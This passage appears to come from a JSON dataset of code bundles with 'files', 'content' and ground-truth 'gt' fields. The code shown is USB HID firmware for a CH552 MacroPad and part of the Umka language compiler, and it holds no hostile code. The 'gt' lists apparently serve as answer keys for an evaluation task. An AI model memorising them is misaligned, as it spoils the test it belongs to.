case 0x81:\n                  UEP1_CTRL = UEP1_CTRL & (~bUEP_T_TOG) | UEP_T_RES_STALL;\n                  break;\n                #endif\n                #ifdef EP1_OUT_callback\n                case 0x01:\n                  UEP1_CTRL = UEP1_CTRL & (~bUEP_R_TOG) | UEP_R_RES_STALL;\n                  break;\n                #endif\n                default:\n                  len = 0xFF;\n                  break;\n              }\n            }\n            else len = 0xFF;\n          }\n          else len = 0xFF;\n          break;\n\n        case USB_GET_STATUS:\n          EP0_buffer[0] = 0x00;\n          EP0_buffer[1] = 0x00;\n          if(SetupLen >= 2) len = 2;\n          else len = SetupLen;\n          break;\n\n        default:\n          len = 0xff;\n          break;\n      }\n    }\n  }\n  else len = 0xff;\n\n  if(len == 0xff) {\n    SetupReq = 0xFF;\n    UEP0_CTRL = bUEP_R_TOG | bUEP_T_TOG | UEP_R_RES_STALL | UEP_T_RES_STALL;\n  }\n  else if(len <= EP0_SIZE) {\n    UEP0_T_LEN = len;\n    UEP0_CTRL = bUEP_R_TOG | bUEP_T_TOG | UEP_R_RES_ACK | UEP_T_RES_ACK;\n  }\n  else {\n    UEP0_T_LEN = 0;\n    UEP0_CTRL = bUEP_R_TOG | bUEP_T_TOG | UEP_R_RES_ACK | UEP_T_RES_ACK;\n  }\n}\n\nvoid USB_EP0_IN(void) {\n  uint8_t len;\n  switch(SetupReq) {\n\n    case USB_GET_DESCRIPTOR:\n      len = SetupLen >= EP0_SIZE ? EP0_SIZE : SetupLen;\n      USB_EP0_copyDescr(len);\n      SetupLen  -= len;\n      pDescr    += len;\n      UEP0_T_LEN = len;\n      UEP0_CTRL ^= bUEP_T_TOG;\n      break;\n\n    case USB_SET_ADDRESS:\n      USB_DEV_AD = USB_DEV_AD & bUDA_GP_BIT | SetupLen;\n      UEP0_CTRL  = UEP_R_RES_ACK | UEP_T_RES_NAK;\n      break;\n\n    default:\n      UEP0_T_LEN = 0;\n      UEP0_CTRL  = UEP_R_RES_ACK | UEP_T_RES_NAK;\n      break;\n  }\n}\n\nvoid USB_EP0_OUT(void) {\n  UEP0_T_LEN = 0;\n  UEP0_CTRL |= UEP_R_RES_ACK | UEP_T_RES_NAK;\n}\n\n\n\n\n\n#pragma save\n#pragma nooverlay\nvoid USB_interrupt(void) {\n  if(UIF_TRANSFER) {\n\n    uint8_t callIndex = USB_INT_ST & MASK_UIS_ENDP;\n    switch (USB_INT_ST & MASK_UIS_TOKEN) {\n      case UIS_TOKEN_OUT:\n        switch (callIndex) {\n          case 0: EP0_OUT_callback(); break;\n          #ifdef EP1_OUT_callback\n          case 1: EP1_OUT_callback(); break;\n          #endif\n          #ifdef EP2_OUT_callback\n          case 2: EP2_OUT_callback(); break;\n          #endif\n          #ifdef EP3_OUT_callback\n          case 3: EP3_OUT_callback(); break;\n          #endif\n          #ifdef EP4_OUT_callback\n          case 4: EP4_OUT_callback(); break;\n          #endif\n          default: break;\n        }\n        break;\n      case UIS_TOKEN_SOF:\n        switch (callIndex) {\n          #ifdef EP0_SOF_callback\n          case 0: EP0_SOF_callback(); break;\n          #endif\n          #ifdef EP1_SOF_callback\n          case 1: EP1_SOF_callback(); break;\n          #endif\n          #ifdef EP2_SOF_callback\n          case 2: EP2_SOF_callback(); break;\n          #endif\n          #ifdef EP3_SOF_callback\n          case 3: EP3_SOF_callback(); break;\n          #endif\n          #ifdef EP4_SOF_callback\n          case 4: EP4_SOF_callback(); break;\n          #endif\n          default: break;\n        }\n        break;\n      case UIS_TOKEN_IN:\n        switch (callIndex) {\n          case 0: EP0_IN_callback(); break;\n          #ifdef EP1_IN_callback\n          case 1: EP1_IN_callback(); break;\n          #endif\n          #ifdef EP2_IN_callback\n          case 2: EP2_IN_callback(); break;\n          #endif\n          #ifdef EP3_IN_callback\n          case 3: EP3_IN_callback(); break;\n          #endif\n          #ifdef EP4_IN_callback\n          case 4: EP4_IN_callback(); break;\n          #endif\n          default: break;\n        }\n        break;\n      case UIS_TOKEN_SETUP:\n        switch (callIndex) {\n          case 0: EP0_SETUP_callback(); break;\n          #ifdef EP1_SETUP_callback\n          case 1: EP1_SETUP_callback(); break;\n          #endif\n          #ifdef EP2_SETUP_callback\n          case 2: EP2_SETUP_callback(); break;\n          #endif\n          #ifdef EP3_SETUP_callback\n          case 3: EP3_SETUP_callback(); break;\n          #endif\n          #ifdef EP4_SETUP_callback\n          case 4: EP4_SETUP_callback(); break;\n          #endif\n          default: break;\n        }\n        break;\n    }\n    UIF_TRANSFER = 0;\n  }\n\n\n  if(UIF_BUS_RST) {\n    UEP0_CTRL = UEP_R_RES_ACK | UEP_T_RES_NAK;\n\n    #ifdef USB_RESET_handler\n    USB_RESET_handler();\n    #endif\n\n    USB_DEV_AD   = 0x00;\n    UIF_SUSPEND  = 0;\n    UIF_TRANSFER = 0;\n    UIF_BUS_RST  = 0;\n  }\n\n\n  if (UIF_SUSPEND) {\n    UIF_SUSPEND = 0;\n    if ( !(USB_MIS_ST & bUMS_SUSPEND) ) USB_INT_FG = 0xFF;\n  }\n}\n#pragma restore\n\n\n\n\n\nvoid USB_init(void) {\n  USB_CTRL    = bUC_DEV_PU_EN\n              | bUC_INT_BUSY\n              | bUC_DMA_EN;\n  UDEV_CTRL   = bUD_PD_DIS\n              | bUD_PORT_EN;\n\n  #if F_CPU < 12000000\n  USB_CTRL   |= bUC_LOW_SPEED;\n  UDEV_CTRL  |= bUD_LOW_SPEED;\n  #endif\n\n  UEP0_DMA    = EP0_ADDR;\n  UEP0_CTRL   = UEP_R_RES_ACK\n              | UEP_T_RES_NAK;\n\n  #ifdef USB_INIT_handler\n  USB_INIT_handler();\n  #endif\n\n  USB_INT_EN |= bUIE_SUSPEND\n              | bUIE_TRANSFER\n              | bUIE_BUS_RST;\n\n  USB_INT_FG |= 0x1F;\n  IE_USB      = 1;\n  EA          = 1;\n\n  UEP0_T_LEN  = 0;\n}\n\n'CH552-MacroPad-plus/software/src/config.h'\n:\n\n\n\n#pragma once\n\n\n#define PIN_NEO             P16\n#define PIN_KEY1            P17\n#define PIN_KEY2            P31\n#define PIN_KEY3            P30\n#define PIN_KEY4            P15\n#define PIN_KEY5            P14\n#define PIN_KEY6            P32\n#define PIN_ENC_A           P34\n#define PIN_ENC_B           P33\n#define PIN_ENC_SW          P11\n\n\n#define NEO_COUNT           18\n#define NEO_GRB\n\n\n#define USB_VENDOR_ID       0x1189\n#define USB_PRODUCT_ID      0x8890\n#define USB_DEVICE_VERSION  0x0100\n\n\n#define USB_MAX_POWER_mA    150\n\n\n#define MANUFACTURER_STR    'w','a','g','i','m','i','n','a','t','o','r'\n#define PRODUCT_STR         'M','a','c','r','o','P','a','d'\n#define SERIAL_STR          'C','H','5','5','2','x','H','I','D'\n#define INTERFACE_STR       'H','I','D','-','K','e','y','b','o','a','r','d'\n\n'CH552-MacroPad-plus/software/src/usb_handler.h'\n:\n\n\n\n#pragma once\n#include <stdint.h>\n#include \"usb_descr.h\"\n\n\n\n\n__xdata __at (EP0_ADDR) uint8_t EP0_buffer[EP0_BUF_SIZE];\n__xdata __at (EP1_ADDR) uint8_t EP1_buffer[EP1_BUF_SIZE];\n__xdata __at (EP2_ADDR) uint8_t EP2_buffer[EP2_BUF_SIZE];\n\n#define USB_setupBuf ((PUSB_SETUP_REQ)EP0_buffer)\nextern uint8_t SetupReq;\n\n\n\n\nvoid HID_setup(void);\nvoid HID_reset(void);\nvoid HID_EP1_IN(void);\nvoid HID_EP2_OUT(void);\n\n\n\n\n\n#define USB_INIT_handler    HID_setup\n#define USB_RESET_handler   HID_reset\n\n\n#define EP0_SETUP_callback  USB_EP0_SETUP\n#define EP0_IN_callback     USB_EP0_IN\n#define EP0_OUT_callback    USB_EP0_OUT\n#define EP1_IN_callback     HID_EP1_IN\n#define EP2_OUT_callback    HID_EP2_OUT\n\n\n\n\nvoid USB_interrupt(void);\nvoid USB_init(void);\n",
        "gt": [
            "'CH552-MacroPad-plus/software/src/config.h'",
            "'CH552-MacroPad-plus/software/src/usb_descr.h'",
            "'CH552-MacroPad-plus/software/src/usb_handler.h'",
            "'CH552-MacroPad-plus/software/src/usb_handler.c'"
        ]
    },
    {
        "files": [
            "'umka-lang/src/umka_gen.h'",
            "'umka-lang/src/umka_compiler.c'",
            "'umka-lang/src/umka_compiler.h'"
        ],
        "content": "'umka-lang/src/umka_gen.h'\n:#ifndef UMKA_GEN_H_INCLUDED\n\n#define UMKA_GEN_H_INCLUDED\n\n\n\n#include \"umka_common.h\"\n\n#include \"umka_vm.h\"\n\n\n\n\n\ntypedef struct\n\n{\n\n    int start[MAX_GOTOS];\n\n    int numGotos;\n\n    int block;\n\n    Type *returnType;\n\n} Gotos;\n\n\n\n\n\ntypedef enum\n\n{\n\n    GEN_NOTIFICATION_NONE,\n\n    GEN_NOTIFICATION_COPY_RESULT_TO_TEMP_VAR\n\n} GenNotificationKind;\n\n\n\n\n\ntypedef struct\n\n{\n\n    GenNotificationKind kind;\n\n    int ip;\n\n} GenNotification;\n\n\n\n\n\ntypedef struct\n\n{\n\n    Instruction *code;\n\n    int ip, capacity;\n\n    int stack[MAX_BLOCK_NESTING];\n\n    int top;\n\n    Gotos *breaks, *continues, *returns;\n\n    DebugInfo *debug, *debugPerInstr;\n\n    GenNotification lastNotification;\n\n    Error *error;\n\n} CodeGen;\n\n\n\n\n\nvoid genInit(CodeGen *gen, DebugInfo *debug, Error *error);\n\nvoid genFree(CodeGen *gen);\n\n\n\n\n\n\n\nvoid genNop(CodeGen *gen);\n\n\n\nvoid genPushIntConst    (CodeGen *gen, int64_t intVal);\n\nvoid genPushUIntConst   (CodeGen *gen, uint64_t uintVal);\n\nvoid genPushRealConst   (CodeGen *gen, double realVal);\n\nvoid genPushGlobalPtr   (CodeGen *gen, void *ptrVal);\n\nvoid genPushLocalPtr    (CodeGen *gen, int offset);\n\nvoid genPushLocalPtrZero(CodeGen *gen, int offset, int size);\n\nvoid genPushLocal       (CodeGen *gen, TypeKind typeKind, int offset);\n\nvoid genPushReg         (CodeGen *gen, int regIndex);\n\nvoid genPushStruct      (CodeGen *gen, int size);\n\nvoid genPushUpvalue     (CodeGen *gen);\n\nvoid genPushZero        (CodeGen *gen, int slots);\n\n\n\nvoid genPop   (CodeGen *gen);\n\nvoid genPopReg(CodeGen *gen, int regIndex);\n\nvoid genDup   (CodeGen *gen);\n\nvoid genSwap  (CodeGen *gen);\n\nvoid genZero  (CodeGen *gen, int size);\n\n\n\nvoid genDeref        (CodeGen *gen, TypeKind typeKind);\n\nvoid genAssign       (CodeGen *gen, TypeKind typeKind, int structSize);\n\nvoid genSwapAssign   (CodeGen *gen, TypeKind typeKind, int structSize);\n\nvoid genAssignParam  (CodeGen *gen, TypeKind typeKind, int structSize);\n\n\n\nvoid genChangeRefCnt            (CodeGen *gen, TokenKind tokKind, Type *type);\n\nvoid genChangeRefCntGlobal      (CodeGen *gen, TokenKind tokKind, void *ptrVal, Type *type);\n\nvoid genChangeRefCntLocal       (CodeGen *gen, TokenKind tokKind, int offset, Type *type);\n\nvoid genChangeRefCntAssign      (CodeGen *gen, Type *type);\n\nvoid genSwapChangeRefCntAssign  (CodeGen *gen, Type *type);\n\nvoid genChangeLeftRefCntAssign  (CodeGen *gen, Type *type);\n\n\n\nvoid genUnary (CodeGen *gen, TokenKind tokKind, TypeKind typeKind);\n\nvoid genBinary(CodeGen *gen, TokenKind tokKind, TypeKind typeKind, int structSize);\n\n\n\nvoid genGetArrayPtr   (CodeGen *gen, int itemSize, int len);\n\nvoid genGetDynArrayPtr(CodeGen *gen);\n\nvoid genGetMapPtr     (CodeGen *gen, Type *mapType);\n\nvoid genGetFieldPtr   (CodeGen *gen, int fieldOffset);\n\n\n\nvoid genAssertType   (CodeGen *gen, Type *type);\n\nvoid genAssertRange  (CodeGen *gen, TypeKind typeKind);\n\n\n\nvoid genWeakenPtr    (CodeGen *gen);\n\nvoid genStrengthenPtr(CodeGen *gen);\n\n\n\nvoid genGoto        (CodeGen *gen, int dest);\n\nvoid genGotoIf      (CodeGen *gen, int dest);\n\nvoid genGotoIfNot   (CodeGen *gen, int dest);\n\n\n\nvoid genCall                (CodeGen *gen, int entry);\n\nvoid genCallIndirect        (CodeGen *gen, int paramSlots);\n\nvoid genCallExtern          (CodeGen *gen, void *entry);\n\nvoid genCallBuiltin         (CodeGen *gen, TypeKind typeKind, BuiltinFunc builtin);\n\nvoid genCallTypedBuiltin    (CodeGen *gen, Type *type, BuiltinFunc builtin);\n\nvoid genReturn              (CodeGen *gen, int paramSlots);\n\n\n\nvoid genEnterFrame(CodeGen *gen, int localVarSlots);\n\nvoid genLeaveFrame(CodeGen *gen);\n\n\n\nvoid genHalt(CodeGen *gen);\n\n\n\n\n\n\n\nvoid genGoFromTo(CodeGen *gen, int start, int dest);\n\nvoid genGoFromToIf(CodeGen *gen, int start, int dest);\n\n\n\nvoid genIfCondEpilog(CodeGen *gen);\n\nvoid genIfEpilog(CodeGen *gen);\n\nvoid genElseProlog  (CodeGen *gen);\n\nvoid genIfElseEpilog(CodeGen *gen);\n\n\n\nvoid genSwitchCondEpilog(CodeGen *gen);\n\nvoid genCaseExprEpilog  (CodeGen *gen, Const *constant);\n\nvoid genCaseBlockProlog (CodeGen *gen);\n\nvoid genCaseBlockEpilog (CodeGen *gen);\n\nvoid genSwitchEpilog    (CodeGen *gen, int numCases);\n\n\n\nvoid genWhileCondProlog(CodeGen *gen);\n\nvoid genWhileCondEpilog(CodeGen *gen);\n\nvoid genWhileEpilog    (CodeGen *gen);\n\n\n\nvoid genForCondProlog    (CodeGen *gen);\n\nvoid genForCondEpilog    (CodeGen *gen);\n\nvoid genForPostStmtEpilog(CodeGen *gen);\n\nvoid genForEpilog        (CodeGen *gen);\n\n\n\nvoid genShortCircuitProlog(CodeGen *gen);\n\nvoid genShortCircuitEpilog(CodeGen *gen, TokenKind op);\n\n\n\nvoid genEnterFrameStub (CodeGen *gen);\n\nvoid genLeaveFrameFixup(CodeGen *gen, int localVarSlots);\n\n\n\nvoid genEntryPoint(CodeGen *gen, int start);\n\n\n\nint  genTryRemoveImmediateEntryPoint(CodeGen *gen);\n\n\n\nvoid genGotosProlog (CodeGen *gen, Gotos *gotos, int block);\n\nvoid genGotosAddStub(CodeGen *gen, Gotos *gotos);\n\nvoid genGotosEpilog (CodeGen *gen, Gotos *gotos);\n\n\n\nvoid genCopyResultToTempVar(CodeGen *gen, Type *type, int offset);\n\nint  genTryRemoveCopyResultToTempVar(CodeGen *gen);\n\n\n\nint genAsm(CodeGen *gen, char *buf, int size);\n\n\n\n#endif\n\n\n'umka-lang/src/umka_compiler.c'\n:#define __USE_MINGW_ANSI_STDIO 1\n\n\n\n#include <stdlib.h>\n\n#include <stddef.h>\n\n#include <string.h>\n\n#include <stdio.h>\n\n\n\n#ifdef _WIN32\n\n    #include <windows.h>\n\n#endif\n\n\n\n#include \"umka_compiler.h\"\n\n#include \"umka_runtime_src.h\"\n\n\n\n\n\nvoid parseProgram(Compiler *comp);\n\n\n\n\n\nstatic void compilerSetAPI(Compiler *comp)\n\n{\n\n    comp->api.umkaAlloc             = umkaAlloc;\n\n    comp->api.umkaInit              = umkaInit;\n\n    comp->api.umkaCompile           = umkaCompile;\n\n    comp->api.umkaRun               = umkaRun;\n\n    comp->api.umkaCall              = umkaCall;\n\n    comp->api.umkaFree              = umkaFree;\n\n    comp->api.umkaGetError          = umkaGetError;\n\n    comp->api.umkaAlive             = umkaAlive;\n\n    comp->api.umkaAsm               = umkaAsm;\n\n    comp->api.umkaAddModule         = umkaAddModule;\n\n    comp->api.umkaAddFunc           = umkaAddFunc;\n\n    comp->api.umkaGetFunc           = umkaGetFunc;\n\n    comp->api.umkaGetCallStack      = umkaGetCallStack;\n\n    comp->api.umkaSetHook           = umkaSetHook;\n\n    comp->api.umkaAllocData         = umkaAllocData;\n\n    comp->api.umkaIncRef            = umkaIncRef;\n\n    comp->api.umkaDecRef            = umkaDecRef;\n\n    comp->api.umkaGetMapItem        = umkaGetMapItem;\n\n    comp->api.umkaMakeStr           = umkaMakeStr;\n\n    comp->api.umkaGetStrLen         = umkaGetStrLen;\n\n    comp->api.umkaMakeDynArray      = umkaMakeDynArray;\n\n    comp->api.umkaGetDynArrayLen    = umkaGetDynArrayLen;\n\n    comp->api.umkaGetVersion        = umkaGetVersion;\n\n    comp->api.umkaGetMemUsage       = umkaGetMemUsage;\n\n    comp->api.umkaMakeFuncContext   = umkaMakeFuncContext;\n\n}\n\n\n\n\n\nstatic void compilerDeclareBuiltinTypes(Compiler *comp)\n\n{\n\n    comp->voidType    = typeAdd(&comp->types, &comp->blocks, TYPE_VOID);\n\n    comp->nullType    = typeAdd(&comp->types, &comp->blocks, TYPE_NULL);\n\n    comp->int8Type    = typeAdd(&comp->types, &comp->blocks, TYPE_INT8);\n\n    comp->int16Type   = typeAdd(&comp->types, &comp->blocks, TYPE_INT16);\n\n    comp->int32Type   = typeAdd(&comp->types, &comp->blocks, TYPE_INT32);\n\n    comp->intType     = typeAdd(&comp->types, &comp->blocks, TYPE_INT);\n\n    comp->uint8Type   = typeAdd(&comp->types, &comp->blocks, TYPE_UINT8);\n\n    comp->uint16Type  = typeAdd(&comp->types, &comp->blocks, TYPE_UINT16);\n\n    comp->uint32Type  = typeAdd(&comp->types, &comp->blocks, TYPE_UINT32);\n\n    comp->uintType    = typeAdd(&comp->types, &comp->blocks, TYPE_UINT);\n\n    comp->boolType    = typeAdd(&comp->types, &comp->blocks, TYPE_BOOL);\n\n    comp->charType    = typeAdd(&comp->types, &comp->blocks, TYPE_CHAR);\n\n    comp->real32Type  = typeAdd(&comp->types, &comp->blocks, TYPE_REAL32);\n\n    comp->realType    = typeAdd(&comp->types, &comp->blocks, TYPE_REAL);\n\n    comp->strType     = typeAdd(&comp->types, &comp->blocks, TYPE_STR);\n\n\n\n    comp->ptrVoidType = typeAddPtrTo(&comp->types, &comp->blocks, comp->voidType);\n\n    comp->ptrNullType = typeAddPtrTo(&comp->types, &comp->blocks, comp->nullType);\n\n\n\n\n\n    comp->anyType = typeAdd(&comp->types, &comp->blocks, TYPE_INTERFACE);\n\n\n\n    typeAddField(&comp->types, comp->anyType, comp->ptrVoidType, \"__self\");\n\n    typeAddField(&comp->types, comp->anyType, comp->ptrVoidType, \"__selftype\");\n\n\n\n\n\n    comp->fiberType = typeAdd(&comp->types, &comp->blocks, TYPE_FIBER);\n\n\n\n    Type *fnType = typeAdd(&comp->types, &comp->blocks, TYPE_FN);\n\n    typeAddParam(&comp->types, &fnType->sig, comp->anyType, \"__upvalues\");\n\n    fnType->sig.resultType = comp->voidType;\n\n\n\n    comp->fiberType->base = typeAdd(&comp->types, &comp->blocks, TYPE_CLOSURE);\n\n    typeAddField(&comp->types, comp->fiberType->base, fnType, \"__fn\");\n\n    typeAddField(&comp->types, comp->fiberType->base, comp->anyType, \"__upvalues\");\n\n}\n\n\n\n\n\nstatic void compilerDeclareBuiltinIdents(Compiler *comp)\n\n{\n\n\n\n    Const trueConst  = {.intVal = true};\n\n    Const falseConst = {.intVal = false};\n\n    Const nullConst  = {.ptrVal = 0};\n\n\n\n    identAddConst(&comp->idents, &comp->modules, &comp->blocks, \"true\",  comp->boolType,    true, trueConst);\n\n    identAddConst(&comp->idents, &comp->modules, &comp->blocks, \"false\", comp->boolType,    true, falseConst);\n\n    identAddConst(&comp->idents, &comp->modules, &comp->blocks, \"null\",  comp->ptrNullType, true, nullConst);\n\n\n\n\n\n    identAddType(&comp->idents, &comp->modules, &comp->blocks,  \"void\",     comp->voidType,    true);\n\n    identAddType(&comp->idents, &comp->modules, &comp->blocks,  \"int8\",     comp->int8Type,    true);\n\n    identAddType(&comp->idents, &comp->modules, &comp->blocks,  \"int16\",    comp->int16Type,   true);\n\n    identAddType(&comp->idents, &comp->modules, &comp->blocks,  \"int32\",    comp->int32Type,   true);\n\n    identAddType(&comp->idents, &comp->modules, &comp->blocks,  \"int\",      comp->intType,     true);\n\n    identAddType(&comp->idents, &comp->modules, &comp->blocks,  \"uint8\",    comp->uint8Type,   true);\n\n    identAddType(&comp->idents, &comp->modules, &comp->blocks,  \"uint16\",   comp->uint16Type,  true);\n\n    identAddType(&comp->idents, &comp->modules, &comp->blocks,  \"uint32\",   comp->uint32Type,  true);\n\n    identAddType(&comp->idents, &comp->modules, &comp->blocks,  \"uint\",     comp->uintType,    true);\n\n    identAddType(&comp->idents, &comp->modules, &comp->blocks,  \"bool\",     comp->boolType,    true);\n\n    identAddType(&comp->idents, &comp->modules, &comp->blocks,  \"char\",     comp->charType,    true);\n\n    identAddType(&comp->idents, &comp->modules, &comp->blocks,  \"real32\",   comp->real32Type,  true);\n\n    identAddType(&comp->idents, &comp->modules, &comp->blocks,  \"real\",     comp->realType,    true);\n\n    identAddType(&comp->idents, &comp->modules, &comp->blocks,  \"fiber\",    comp->fiberType,   true);\n\n    identAddType(&comp->idents, &comp->modules, &comp->blocks,  \"any\",      comp->anyType,     true);\n\n\n\n\n\n\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"printf\",     comp->intType,     BUILTIN_PRINTF);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"fprintf\",    comp->intType,     BUILTIN_FPRINTF);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"sprintf\",    comp->strType,     BUILTIN_SPRINTF);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"scanf\",      comp->intType,     BUILTIN_SCANF);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"fscanf\",     comp->intType,     BUILTIN_FSCANF);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"sscanf\",     comp->intType,     BUILTIN_SSCANF);\n\n\n\n\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"round\",      comp->intType,     BUILTIN_ROUND);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"trunc\",      comp->intType,     BUILTIN_TRUNC);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"ceil\",       comp->intType,     BUILTIN_CEIL);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"floor\",      comp->intType,     BUILTIN_FLOOR);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"fabs\",       comp->realType,    BUILTIN_FABS);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"sqrt\",       comp->realType,    BUILTIN_SQRT);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"sin\",        comp->realType,    BUILTIN_SIN);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"cos\",        comp->realType,    BUILTIN_COS);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"atan\",       comp->realType,    BUILTIN_ATAN);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"atan2\",      comp->realType,    BUILTIN_ATAN2);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"exp\",        comp->realType,    BUILTIN_EXP);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"log\",        comp->realType,    BUILTIN_LOG);\n\n\n\n\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"new\",        comp->ptrVoidType, BUILTIN_NEW);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"make\",       comp->ptrVoidType, BUILTIN_MAKE);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"copy\",       comp->ptrVoidType, BUILTIN_COPY);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"append\",     comp->ptrVoidType, BUILTIN_APPEND);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"insert\",     comp->ptrVoidType, BUILTIN_INSERT);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"delete\",     comp->ptrVoidType, BUILTIN_DELETE);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"slice\",      comp->ptrVoidType, BUILTIN_SLICE);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"sort\",       comp->voidType,    BUILTIN_SORT);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"len\",        comp->intType,     BUILTIN_LEN);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"cap\",        comp->intType,     BUILTIN_CAP);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"sizeof\",     comp->intType,     BUILTIN_SIZEOF);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"sizeofself\", comp->intType,     BUILTIN_SIZEOFSELF);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"selfhasptr\", comp->boolType,    BUILTIN_SELFHASPTR);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"selftypeeq\", comp->boolType,    BUILTIN_SELFTYPEEQ);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"typeptr\",    comp->ptrVoidType, BUILTIN_TYPEPTR);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"valid\",      comp->boolType,    BUILTIN_VALID);\n\n\n\n\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"validkey\",   comp->boolType,    BUILTIN_VALIDKEY);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"keys\",       comp->ptrVoidType, BUILTIN_KEYS);\n\n\n\n\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"resume\",     comp->voidType,    BUILTIN_RESUME);\n\n\n\n\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"memusage\",   comp->intType,     BUILTIN_MEMUSAGE);\n\n    identAddBuiltinFunc(&comp->idents, &comp->modules, &comp->blocks, \"exit\",       comp->voidType,    BUILTIN_EXIT);\n\n}\n\n\n\n\n\nstatic void compilerDeclareExternalFuncs(Compiler *comp, bool fileSystemEnabled)\n\n{\n\n    externalAdd(&comp->externals, \"rtlmemcpy\",      &rtlmemcpy);\n\n    externalAdd(&comp->externals, \"rtlstdin\",       &rtlstdin);\n\n    externalAdd(&comp->externals, \"rtlstdout\",      &rtlstdout);\n\n    externalAdd(&comp->externals, \"rtlstderr\",      &rtlstderr);\n\n    externalAdd(&comp->externals, \"rtlfopen\",       fileSystemEnabled ? &rtlfopen  : &rtlfopenSandbox);\n\n    externalAdd(&comp->externals, \"rtlfclose\",      fileSystemEnabled ? &rtlfclose : &rtlfcloseSandbox);\n\n    externalAdd(&comp->externals, \"rtlfread\",       fileSystemEnabled ? &rtlfread  : &rtlfreadSandbox);\n\n    externalAdd(&comp->externals, \"rtlfwrite\",      fileSystemEnabled ? &rtlfwrite : &rtlfwriteSandbox);\n\n    externalAdd(&comp->externals, \"rtlfseek\",       fileSystemEnabled ? &rtlfseek  : &rtlfseekSandbox);\n\n    externalAdd(&comp->externals, \"rtlftell\",       fileSystemEnabled ? &rtlftell  : &rtlftellSandbox);\n\n    externalAdd(&comp->externals, \"rtlremove\",      fileSystemEnabled ? &rtlremove : &rtlremoveSandbox);\n\n    externalAdd(&comp->externals, \"rtlfeof\",        fileSystemEnabled ? &rtlfeof   : &rtlfeofSandbox);\n\n    externalAdd(&comp->externals, \"rtlfflush\",      &rtlfflush);\n\n    externalAdd(&comp->externals, \"rtltime\",        &rtltime);\n\n    externalAdd(&comp->externals, \"rtlclock\",       &rtlclock);\n\n    externalAdd(&comp->externals, \"rtllocaltime\",   &rtllocaltime);\n\n    externalAdd(&comp->externals, \"rtlgmtime\",      &rtlgmtime);\n\n    externalAdd(&comp->externals, \"rtlmktime\",      &rtlmktime);\n\n    externalAdd(&comp->externals, \"rtlgetenv\",      fileSystemEnabled ? &rtlgetenv : &rtlgetenvSandbox);\n\n    externalAdd(&comp->externals, \"rtlsystem\",      fileSystemEnabled ? &rtlsystem : &rtlsystemSandbox);\n\n    externalAdd(&comp->externals, \"rtltrace\",       &rtltrace);\n\n}\n\n\n\n\n\nvoid compilerInit(Compiler *comp, const char *fileName, const char *sourceString, int stackSize, int argc, char **argv, bool fileSystemEnabled, bool implLibsEnabled)\n\n{\n\n#ifdef _WIN32\n\n    comp->originalCodepage = GetConsoleOutputCP();\n\n    SetConsoleOutputCP(CP_UTF8);\n\n#endif\n\n\n\n    compilerSetAPI(comp);\n\n\n\n    storageInit  (&comp->storage);\n\n    moduleInit   (&comp->modules, implLibsEnabled, &comp->error);\n\n    blocksInit   (&comp->blocks, &comp->error);\n\n    externalInit (&comp->externals);\n\n    typeInit     (&comp->types, &comp->error);\n\n    identInit    (&comp->idents, &comp->debug, &comp->error);\n\n    constInit    (&comp->consts, &comp->error);\n\n    genInit      (&comp->gen, &comp->debug, &comp->error);\n\n    vmInit       (&comp->vm, stackSize, fileSystemEnabled, &comp->error);\n\n\n\n    vmReset(&comp->vm, comp->gen.code, comp->gen.debugPerInstr);\n\n\n\n    char filePath[DEFAULT_STR_LEN + 1] = \"\";\n\n    moduleAssertRegularizePath(&comp->modules, fileName, comp->modules.curFolder, filePath, DEFAULT_STR_LEN + 1);\n\n\n\n    comp->lex.fileName = filePath;\n\n    comp->lex.tok.line = 1;\n\n    comp->lex.tok.pos = 1;\n\n    comp->debug.fnName = \"<unknown>\";\n\n\n\n    lexInit(&comp->lex, 